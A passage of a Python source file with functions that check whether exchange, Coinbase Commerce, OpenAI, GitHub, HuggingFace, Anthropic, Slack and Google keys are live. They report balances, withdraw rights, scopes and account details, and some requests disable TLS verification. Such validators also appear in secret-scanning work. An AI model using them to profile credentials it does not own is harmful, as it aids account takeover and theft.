                'permissions':  perm_str,
                'can_trade':    str(d.get('canTrade', '')),
                'can_withdraw': str(d.get('canWithdraw', '')),
                'can_deposit':  str(d.get('canDeposit', '')),
                'account_type': d.get('accountType', ''),
                'balances':     bal_str,
            }
        elif r.status_code == 401:
            return {'validation': 'INVALID — API key rejected', 'validated': False}
    except Exception:
        pass
    return None


# ── Coinbase Commerce validation ──────────────────────────────────────────────

def validate_coinbase(api_key: str, timeout: int = 10) -> dict | None:
    """
    Validate Coinbase Commerce API key.
    Pulls merchant store info and charge count to show what the key can access.
    """
    if not api_key:
        return None
    hdrs = {'X-CC-Api-Key': api_key, 'X-CC-Version': '2018-03-22'}
    try:
        # Primary: get merchant store info
        rs = requests.get('https://api.commerce.coinbase.com/stores/me',
                          headers=hdrs, timeout=timeout, verify=False)
        if rs.status_code == 200:
            store = rs.json().get('data', {})
            merchant_name = store.get('name', '')
            merchant_id   = store.get('id', '')
        elif rs.status_code in (401, 403):
            return {'validation': 'INVALID — API key rejected', 'validated': False}
        else:
            merchant_name = ''
            merchant_id   = ''

        # Secondary: count charges (shows billing/payment access)
        rc = requests.get('https://api.commerce.coinbase.com/charges?limit=100',
                          headers=hdrs, timeout=timeout, verify=False)
        if rc.status_code == 200:
            charge_data  = rc.json()
            charge_count = len(charge_data.get('data', []))
            pagination   = charge_data.get('pagination', {})
            total_count  = pagination.get('total', charge_count)
        else:
            charge_count = 0
            total_count  = 'unknown'

        return {
            'validation':    'LIVE — credentials confirmed',
            'capabilities':  'CREATE_CHARGE | LIST_CHARGES | MANAGE_ORDERS',
            'merchant_name': merchant_name,
            'merchant_id':   merchant_id,
            'total_charges': str(total_count),
        }
    except Exception:
        pass
    return None


# ── OpenAI validation ─────────────────────────────────────────────────────────

def validate_openai(api_key: str, timeout: int = 10) -> dict | None:
    """
    Validate OpenAI API key via /v1/models.
    Returns model list metadata so the caller can judge billing access.
    """
    if not api_key:
        return None
    try:
        r = requests.get(
            'https://api.openai.com/v1/models',
            headers={'Authorization': f'Bearer {api_key}'},
            timeout=timeout,
        )
        if r.status_code == 200:
            data        = r.json().get('data') or []
            model_ids   = [m.get('id', '') for m in data[:6]]
            gpt4_access = any('gpt-4' in m for m in model_ids)
            return {
                'validation':    'LIVE — OpenAI key confirmed',
                'capabilities':  'CREATE_COMPLETION | LIST_MODELS',
                'model_count':   str(len(data)),
                'top_models':    ', '.join(model_ids),
                'gpt4_access':   str(gpt4_access),
                'validated':     True,
            }
        if r.status_code == 401:
            return {'validation': 'INVALID — OpenAI key rejected', 'validated': False}
    except Exception:
        pass
    return None


# ── GitHub token validation ───────────────────────────────────────────────────

def validate_github_token(token: str, timeout: int = 10) -> dict | None:
    """
    Validate GitHub personal access token / fine-grained PAT via /user.
    Returns user metadata and OAuth scopes to show access level.
    """
    if not token:
        return None
    try:
        r = requests.get(
            'https://api.github.com/user',
            headers={'Authorization': f'token {token}',
                     'Accept': 'application/vnd.github.v3+json'},
            timeout=timeout,
        )
        if r.status_code == 200:
            d      = r.json()
            scopes = r.headers.get('X-OAuth-Scopes', 'unknown')
            return {
                'validation':   'LIVE — GitHub token confirmed',
                'capabilities': scopes or 'READ_USER',
                'github_user':  d.get('login', ''),
                'github_email': d.get('email', '') or '',
                'public_repos': str(d.get('public_repos', 0)),
                'token_scopes': scopes,
                'validated':    True,
            }
        if r.status_code == 401:
            return {'validation': 'INVALID — GitHub token rejected', 'validated': False}
    except Exception:
        pass
    return None


# ── HuggingFace token validation ──────────────────────────────────────────────

def validate_huggingface(token: str, timeout: int = 10) -> dict | None:
    """
    Validate HuggingFace token via /api/whoami.
    Returns user info and org memberships to show inference/model access.
    """
    if not token:
        return None
    try:
        r = requests.get(
            'https://huggingface.co/api/whoami',
            headers={'Authorization': f'Bearer {token}'},
            timeout=timeout,
        )
        if r.status_code == 200:
            d    = r.json()
            orgs = ', '.join(o.get('name', '') for o in (d.get('orgs') or [])[:4])
            return {
                'validation':   'LIVE — HuggingFace token confirmed',
                'capabilities': 'INFERENCE_API | MODEL_ACCESS | DATASETS',
                'hf_user':      d.get('name', ''),
                'hf_email':     d.get('email', '') or '',
                'hf_orgs':      orgs,
                'validated':    True,
            }
        if r.status_code == 401:
            return {'validation': 'INVALID — HuggingFace token rejected', 'validated': False}
    except Exception:
        pass
    return None


# ── Anthropic / Claude API key validation ────────────────────────────────────

def validate_anthropic(api_key: str, timeout: int = 10) -> dict | None:
    if not api_key or not api_key.startswith('sk-ant-'):
        return None
    try:
        r = requests.get(
            'https://api.anthropic.com/v1/models',
            headers={
                'x-api-key':         api_key,
                'anthropic-version': '2023-06-01',
            },
            timeout=timeout,
        )
        if r.status_code == 200:
            data   = r.json().get('data') or []
            models = [m.get('id', '') for m in data[:6]]
            return {
                'validation':   'LIVE — Anthropic/Claude API key confirmed',
                'capabilities': 'CLAUDE_API | TEXT_GENERATION | VISION',
                'top_models':   ', '.join(models),
                'model_count':  str(len(data)),
                'validated':    True,
            }
        if r.status_code == 401:
            return {'validation': 'INVALID — Anthropic key rejected', 'validated': False}
        if r.status_code == 403:
            return {
                'validation':   'LIVE — Anthropic key valid (API access restricted)',
                'capabilities': 'RESTRICTED',
                'validated':    True,
            }
    except Exception:
        pass
    return None


# ── Slack token validation ─────────────────────────────────────────────────────

def validate_slack(token: str, timeout: int = 10) -> dict | None:
    if not token or not token.startswith('xox'):
        return None
    try:
        r = requests.post(
            'https://slack.com/api/auth.test',
            headers={'Authorization': f'Bearer {token}',
                     'Content-Type': 'application/json'},
            timeout=timeout,
        )
        if r.status_code == 200:
            body = r.json()
            if body.get('ok'):
                return {
                    'validation':   'LIVE — Slack token confirmed',
                    'capabilities': 'SLACK_API | READ_MESSAGES | POST_MESSAGES',
                    'slack_team':   body.get('team', ''),
                    'slack_user':   body.get('user', ''),
                    'slack_url':    body.get('url', ''),
                    'validated':    True,
                }
            err = body.get('error', '')
            if err in ('invalid_auth', 'not_authed', 'account_inactive', 'token_revoked'):
                return {'validation': f'INVALID — Slack token rejected ({err})', 'validated': False}
    except Exception:
        pass
    return None


# ── Google API key validation ─────────────────────────────────────────────────

def validate_google_api_key(api_key: str, timeout: int = 10) -> dict | None:
    """
    Validate a Google API key by probing a low-cost, read-only endpoint.
    Uses the Maps Geocoding API with a deliberately invalid address so no
    quota is consumed on success — a 200 with any geocoding response
    (including ZERO_RESULTS) confirms the key is live and unrestricted.
    A REQUEST_DENIED response with keyInvalid confirms the key is dead.
    """
    if not api_key or not api_key.startswith('AIza'):
        return None
    try:
        r = requests.get(
            'https://maps.googleapis.com/maps/api/geocode/json',
            params={'address': '___probe___', 'key': api_key},
            timeout=timeout,
        )
        if r.status_code == 200:
            body = r.json()
            status = body.get('status', '')
            if status in ('OK', 'ZERO_RESULTS'):
                return {
                    'validation':    'LIVE — Google API key accepted (Maps Geocoding)',
                    'capabilities':  'MAPS_GEOCODING (and potentially others)',
                    'google_status': status,
                    'validated':     True,
                }
            if status == 'REQUEST_DENIED':
                err = body.get('error_message', '')
                if 'keyInvalid' in err or 'not authorized' in err.lower():
                    return {'validation': 'INVALID — Google API key rejected', 'validated': False}
                # REQUEST_DENIED but not keyInvalid means key is valid but
                # Maps API is disabled/restricted — still a live key
                return {
                    'validation':    'LIVE — Google API key valid (Maps API restricted)',
                    'capabilities':  'OTHER_APIS (Maps Geocoding restricted or disabled)',
                    'google_status': status,
                    'google_error':  err,
                    'validated':     True,
                }
            if status == 'OVER_QUERY_LIMIT':
                return {
                    'validation': 'LIVE — Google API key valid (quota exhausted)',
                    'validated':  True,
                }
    except Exception:
        pass
    return None
